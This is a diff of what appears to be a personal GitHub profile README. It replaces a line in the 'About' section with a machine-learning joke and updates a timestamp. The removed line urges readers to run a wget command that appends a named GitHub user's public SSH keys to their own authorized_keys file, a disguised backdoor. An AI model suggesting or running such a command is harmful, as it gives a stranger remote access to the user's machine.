@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
+🧠 Machine learning? More like machine teaching me.
 
 <!--✏️ **Blog Posts**-->
 
@@ -28,4 +28,4 @@
 
 🕒 **Last Update**
 
-02-04-2025 08:23:54 UTC
+02-04-2025 12:35:55 UTC
